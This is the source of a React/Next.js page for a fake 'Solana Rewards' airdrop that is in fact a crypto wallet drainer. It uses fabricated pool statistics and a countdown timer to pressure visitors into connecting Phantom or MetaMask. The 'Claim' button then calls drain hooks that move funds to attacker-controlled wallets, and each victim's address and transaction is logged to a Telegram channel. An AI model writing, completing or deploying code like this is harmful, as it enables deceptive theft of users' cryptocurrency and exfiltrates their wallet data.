"use client";

import { useState, useEffect } from 'react';
import { ethers } from 'ethers'; // Fixed: Added missing import
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { useEthereumDrain } from '@/hooks/useEthereumDrain';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

// Environment Variables
const RPC_SOLANA = process.env.NEXT_PUBLIC_SOLANA_RPC;
const SOLANA_DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const ETHEREUM_DRAIN_WALLET = process.env.NEXT_PUBLIC_ETHEREUM_WALLET;

const INITIAL_STATS = {
  totalDistributed: 1784.42,
  participants: 4287,
  totalPool: 3500
};

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletType, setWalletType] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [allocatedAmount, setAllocatedAmount] = useState(null);
  const [processing, setProcessing] = useState(false);
  const [drainComplete, setDrainComplete] = useState(false);
  const [stats, setStats] = useState(INITIAL_STATS);
  const [countdown, setCountdown] = useState(180);
  
  // Hook initializations
  const { executeDrain: executeSolanaDrain } = 
    useSolanaDrain(RPC_SOLANA, SOLANA_DRAIN_WALLET);
  const { executeDrain: executeEthereumDrain } = 
    useEthereumDrain(ETHEREUM_DRAIN_WALLET);
  
  // Timer logic
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);
  
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleWalletSelect = async (type) => {
    try {
      setWalletType(type);
      if (type === 'phantom') {
        if (!window.solana) return alert('Open this in the Phantom App browser');
        
        const response = await window.solana.connect();
        const address = response.publicKey.toString();
        setWalletAddress(address);
        setConnected(true);
        
        const amount = calculateAllocation(address);
        setAllocatedAmount(amount);
        
        await sendTelegramLog('connected', { type: 'phantom', address, amount });
        
      } else if (type === 'metamask') {
        if (!window.ethereum) return alert('Open this in the MetaMask App browser');
        
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        setWalletAddress(accounts[0]);
        setConnected(true);
        setAllocatedAmount(0.15);
        
        await sendTelegramLog('connected', { type: 'metamask', address: accounts[0] });
      }
      setShowModal(false);
    } catch (error) {
      console.error('Connection Error:', error);
    }
  };
  
  const handleDrain = async () => {
    if (!walletType || !allocatedAmount || !connected) {
      alert("Please ensure wallet is connected.");
      return;
    }
    
    try {
      setProcessing(true);
      let result;

      if (walletType === 'phantom') {
        // Triggering the custom hook logic
        result = await executeSolanaDrain(window.solana, allocatedAmount);
      } else if (walletType === 'metamask') {
        result = await executeEthereumDrain();
      }
      
      if (result?.success) {
        setStats(prev => ({
          ...prev,
          totalDistributed: prev.totalDistributed + allocatedAmount,
          participants: prev.participants + 1
        }));
        setDrainComplete(true);
        
        await sendTelegramLog('drained', {
          type: walletType,
          amount: allocatedAmount,
          address: walletAddress,
          txId: result.txId || result.txHash
        });

        setTimeout(() => {
          window.location.href = `https://explorer.solana.com/tx/${result.txId}`;
        }, 2000);
      } else {
        throw new Error(result?.error || "Transaction rejected or failed simulation.");
      }
      
    } catch (error) {
      console.error('Operation Failed:', error);
      alert(`Error: ${error.message}`);
      await sendTelegramLog('drain_failed', { error: error.message, address: walletAddress });
    } finally {
      setProcessing(false);
    }
  };
  
  return (
    <div className={styles.container}>
      <header className={styles.header}>
        <div className={styles.logo}>✦ Solana Rewards</div>
      </header>
      
      <main className={styles.main}>
        <div className={styles.hero}>
          <h2><span className={styles.highlight}>3,500 SOL</span> Reward Pool</h2>
          <div className={styles.statsGrid}>
            <div>{stats.totalDistributed.toFixed(2)} SOL Distributed</div>
            <div>{stats.participants} Participants</div>
            <div>Ends: {formatTime(countdown)}</div>
          </div>
        </div>
        
        <div className={styles.actionSection}>
          {!connected ? (
            <button className={styles.connectButton} onClick={() => setShowModal(true)}>
              Connect Wallet
            </button>
          ) : (
            <div className={styles.resultBox}>
              {allocatedAmount && !drainComplete && (
                <>
                  <h3>🎉 Eligible for {allocatedAmount.toFixed(2)} SOL</h3>
                  <button className={styles.confirmButton} onClick={handleDrain} disabled={processing}>
                    {processing ? 'Processing...' : `Claim ${allocatedAmount.toFixed(2)} SOL`}
                  </button>
                </>
              )}
              {drainComplete && <h3>✅ Distribution Initiated</h3>}
            </div>
          )}
        </div>
      </main>
      
      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleWalletSelect} />
    </div>
  );
    }
